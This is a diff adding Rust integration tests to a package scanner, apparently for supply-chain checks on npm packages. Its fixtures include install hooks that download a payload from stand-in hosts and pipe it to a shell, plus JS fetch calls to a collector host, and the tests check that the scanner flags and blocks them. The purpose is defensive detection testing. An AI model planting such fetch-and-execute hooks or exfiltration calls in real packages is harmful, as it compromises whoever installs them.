@@ -5,7 +5,7 @@
 //! the full fetch pipeline against a `MockTransport` that hands back the
 //! right bytes for the right URLs.
 
-use argus_core::Decision;
+use argus_core::{Decision, ScanReport};
 use argus_fetch::{fetch_and_scan, FetchOptions, PackageRef};
 use argus_test_support::MockTransport;
 use base64::engine::general_purpose::STANDARD;
@@ -31,6 +31,46 @@ fn make_targz(entries: &[(&str, &[u8])]) -> Vec<u8> {
         builder.finish().unwrap();
     }
     gz.finish().unwrap()
+}
+
+fn fetch_syntax_fixture(
+    package_json: &[u8],
+    sources: &[(&str, &[u8])],
+) -> anyhow::Result<ScanReport> {
+    let cache = tempfile::tempdir()?;
+    let registry = "https://mock.registry";
+    let mut source_paths = Vec::with_capacity(sources.len());
+    for (path, _) in sources {
+        source_paths.push(format!("package/{path}"));
+    }
+    let mut entries = vec![("package/package.json", package_json)];
+    entries.extend(
+        source_paths
+            .iter()
+            .zip(sources)
+            .map(|(path, (_, body))| (path.as_str(), *body)),
+    );
+    let tarball = make_targz(&entries);
+    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
+    let tarball_url = format!("{registry}/syntax-demo/-/syntax-demo-1.0.0.tgz");
+    let packument = format!(
+        r#"{{
+          "name": "syntax-demo",
+          "dist-tags": {{"latest": "1.0.0"}},
+          "versions": {{
+            "1.0.0": {{"dist": {{"tarball": "{tarball_url}", "integrity": "{integrity}"}}}}
+          }}
+        }}"#
+    );
+    let transport = MockTransport::new();
+    transport.insert(&format!("{registry}/syntax-demo"), packument.into_bytes());
+    transport.insert(&tarball_url, tarball);
+    let opts = FetchOptions {
+        registry: registry.to_string(),
+        cache_dir: Some(cache.path().to_path_buf()),
+        ..FetchOptions::default()
+    };
+    fetch_and_scan(&PackageRef::parse("syntax-demo")?, &opts, &transport)
 }
 
 #[test]
@@ -458,4 +498,187 @@ fn fetch_provenance_malformed_payload_records_parse_failed() -> anyhow::Result<(
         "got: {rule_ids:?}"
     );
     Ok(())
+}
+
+#[test]
+fn npm_lifecycle_ast_resolves_aliases_and_constants_once() -> anyhow::Result<()> {
+    let report = fetch_syntax_fixture(
+        br#"{
+          "name":"syntax-demo",
+          "version":"1.0.0",
+          "scripts":{
+            "postinstall":"BASE=https://collector.example.invalid; alias send=curl; send \"$BASE/payload\" | sh",
+            "prepare":"bash -c 'curl https://second.example.invalid/payload | bash'"
+          }
+        }"#,
+        &[],
+    )?;
+    for rule_id in ["remote-download", "shell-pipe-execution"] {
+        let matches = report
+            .findings
+            .iter()
+            .filter(|finding| finding.rule_id == rule_id)
+            .collect::<Vec<_>>();
+        assert_eq!(matches.len(), 1, "{rule_id}: {:?}", report.findings);
+        assert_eq!(matches[0].location.as_deref(), Some("package.json:scripts"));
+    }
+    assert_eq!(report.decision, Decision::Block);
+    Ok(())
+}
+
+#[test]
+fn npm_lifecycle_ast_ignores_inert_remote_shell_text() -> anyhow::Result<()> {
+    let report = fetch_syntax_fixture(
+        br#"{
+          "name":"syntax-demo",
+          "version":"1.0.0",
+          "scripts":{"postinstall":"printf '%s\n' 'curl https://collector.example.invalid/payload | sh' # inert example"}
+        }"#,
+        &[],
+    )?;
+    assert!(
+        report.findings.iter().all(|finding| !matches!(
+            finding.rule_id.as_str(),
+            "remote-download" | "shell-pipe-execution"
+        )),
+        "got: {:?}",
+        report.findings
+    );
+    Ok(())
+}
+
+#[test]
+fn npm_custom_script_keeps_remote_shell_detection() -> anyhow::Result<()> {
+    let report = fetch_syntax_fixture(
+        br#"{
+          "name":"syntax-demo",
+          "version":"1.0.0",
+          "scripts":{"release":"curl https://collector.example.invalid/payload | sh"}
+        }"#,
+        &[],
+    )?;
+    let rule_ids = report
+        .findings
+        .iter()
+        .map(|finding| finding.rule_id.as_str())
+        .collect::<Vec<_>>();
+    assert!(rule_ids.contains(&"remote-download"), "got: {rule_ids:?}");
+    assert!(
+        rule_ids.contains(&"shell-pipe-execution"),
+        "got: {rule_ids:?}"
+    );
+    Ok(())
+}
+
+#[test]
+fn npm_source_ast_covers_all_js_ts_extensions_and_deduplicates() -> anyhow::Result<()> {
+    let source = br#"
+const base = "https://collector.example.invalid";
+const send = globalThis.fetch;
+send(base + "/first");
+send(base + "/second");
+"#;
+    let files = [
+        ("src/a.js", source.as_slice()),
+        ("src/b.mjs", source.as_slice()),
+        ("src/c.cjs", source.as_slice()),
+        ("src/d.ts", source.as_slice()),
+        ("src/e.mts", source.as_slice()),
+        ("src/f.cts", source.as_slice()),
+    ];
+    let report = fetch_syntax_fixture(br#"{"name":"syntax-demo","version":"1.0.0"}"#, &files)?;
+    let findings = report
+        .findings
+        .iter()
+        .filter(|finding| finding.rule_id == "network-exfiltration")
+        .collect::<Vec<_>>();
+    assert_eq!(findings.len(), files.len(), "got: {:?}", report.findings);
+    let locations = findings
+        .iter()
+        .map(|finding| finding.location.as_deref().expect("source location"))
+        .collect::<std::collections::BTreeSet<_>>();
+    assert_eq!(locations.len(), files.len(), "got: {locations:?}");
+    assert_eq!(report.decision, Decision::Block);
+    Ok(())
+}
+
+#[test]
+fn npm_source_ast_ignores_comments_and_strings() -> anyhow::Result<()> {
+    let inert = br#"
+// fetch("https://collector.example.invalid/comment");
+const docs = `axios.post("https://collector.example.invalid/string")`;
+"#;
+    let report = fetch_syntax_fixture(
+        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
+        &[
+            ("src/inert.js", inert),
+            ("src/inert.ts", inert),
+            ("README.txt", inert),
+        ],
+    )?;
+    assert!(
+        report
+            .findings
+            .iter()
+            .all(|finding| finding.rule_id != "network-exfiltration"),
+        "got: {:?}",
+        report.findings
+    );
+    Ok(())
+}
+
+#[test]
+fn npm_source_ast_preserves_host_exclusions_and_dynamic_values() -> anyhow::Result<()> {
+    let report = fetch_syntax_fixture(
+        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
+        &[(
+            "src/safe.js",
+            br#"
+fetch("http://localhost/status");
+fetch("http://127.0.0.1/status");
+fetch("http://[::1]/status");
+fetch("https://api.github.com/repos/example/demo");
+fetch(runtime_url);
+"#,
+        )],
+    )?;
+    assert!(
+        report
+            .findings
+            .iter()
+            .all(|finding| finding.rule_id != "network-exfiltration"),
+        "got: {:?}",
+        report.findings
+    );
+    Ok(())
+}
+
+#[test]
+fn npm_malformed_supported_source_fails_closed() {
+    let error = fetch_syntax_fixture(
+        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
+        &[("src/broken.ts", b"const broken = ;")],
+    )
+    .unwrap_err();
+    assert!(
+        format!("{error:#}").contains("refusing incomplete analysis"),
+        "got: {error:#}"
+    );
+}
+
+#[test]
+fn npm_malformed_lifecycle_script_fails_closed() {
+    let error = fetch_syntax_fixture(
+        br#"{
+          "name":"syntax-demo",
+          "version":"1.0.0",
+          "scripts":{"postinstall":"if true; then curl https://collector.example.invalid"}
+        }"#,
+        &[],
+    )
+    .unwrap_err();
+    assert!(
+        format!("{error:#}").contains("refusing incomplete analysis"),
+        "got: {error:#}"
+    );
 }
